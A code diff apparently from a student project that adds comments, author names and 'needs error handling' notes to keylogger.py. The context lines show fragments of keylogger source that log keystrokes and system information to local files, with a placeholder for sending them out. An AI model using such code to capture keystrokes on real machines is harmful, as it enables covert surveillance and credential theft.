@@ -1,5 +1,6 @@
 #Team myKeys
 #keylogger.py
+#Connor Blaszkiewicz and Neta Shiff
 
 # Libraries Used
 import socket
@@ -36,7 +37,9 @@ extendedPath = path + extend
 ### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
 
 
+### This creates a document that contains useful system information and specifications ###
 def getSystemInfo():
+    #needs error handling
     with open(extendedPath + systemInfo, "a") as f:
         hostname = socket.gethostname()
         # Writes hostname
@@ -94,6 +97,7 @@ while currentTime < endTime:
 
     ### Writes keys to file ###
     def writeToFile(keys):
+        #needs error handling
         with open(extendedPath + loggedKeys, "a") as f:
             for key in keys:
                 k = str(key.replace("'",""))
@@ -106,6 +110,7 @@ while currentTime < endTime:
 
     ### When a key is released ###
     def onRelease(key):
+        # This may not be needed
         if key == Key.esc:
             return False 
         if currentTime > endTime:
@@ -115,6 +120,7 @@ while currentTime < endTime:
         listener.join()
 
     if currentTime > endTime:
+        #needs error handling
         with open(extendedPath + loggedKeys, "w") as f:
             f.write()
         
